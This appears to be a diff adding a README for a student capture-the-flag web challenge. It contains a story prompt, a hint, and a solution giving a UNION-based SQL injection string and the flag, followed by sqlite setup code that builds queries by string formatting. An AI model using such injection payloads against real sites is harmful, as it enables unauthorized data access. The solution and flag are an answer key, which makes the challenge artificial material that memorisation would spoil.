@@ -1,0 +1,44 @@
+
+Challenge
+=========
+
+I have a crush on this cute girl Sarah and she's throwing her birthday party next week. She sent out some invites to random lucky people but I didn't get one. Fortunately there's another way to get in. The other week I overheard a conversation between her friends, they were saying that Sarah keeps a list of quotes in her "wildcard" diary and it contains a phrase that, whoever guesses, will get a wildcard entry to her party. I found her webpage where she keeps information on the invitees, and my gut feeling says that she might be keeping her secret wildcard phrase there too. Can you help me get an entry to the party?
+
+https://hackersoc.tk/ctf/web200/
+
+Hint: There is a second table called "wildcard", maybe you can inject with UNION to join
+      and display from both tables?
+
+(The hint costs 50 points.)
+
+
+Solution
+========
+
+Use this query to get the flag: ' UNION SELECT * FROM wildcard --
+
+flag{8DECEDD711115FREEentry}
+
+Inspired by https://github.com/ctfs/write-ups-2017/tree/master/breakin-ctf-2017/web/Wild-Card-Entry!
+
+
+Setup
+=====
+
+$ python
+>>> import sqlite3, random
+>>> conn = sqlite3.connect("superdb.sqlite3")
+>>> c = conn.cursor()
+>>> c.execute("CREATE TABLE wildcard (phrase TEXT, entries INT)")
+>>> c.execute("INSERT INTO wildcard VALUES ('flag{8DECEDD711115FREEentry}', 1)")
+>>> c.execute("CREATE TABLE invitations (name TEXT, age INT)")
+>>> names = "hannah jake steven bobby ruth sam melissa rick alex chris ludovic gregory jason amanda kelly mike david harry francesco sidney".split()
+>>> data = [[i, random.randint(18,35)] for i in names]
+>>> try:
+...     for i in data:
+...             c.execute("INSERT INTO invitations VALUES ('{}', {})".format(*i))
+... except sqlite3.IntegrityError:
+...     print "\n[!] There was a problem...\n"
+...
+>>> conn.commit()
+>>> conn.close()
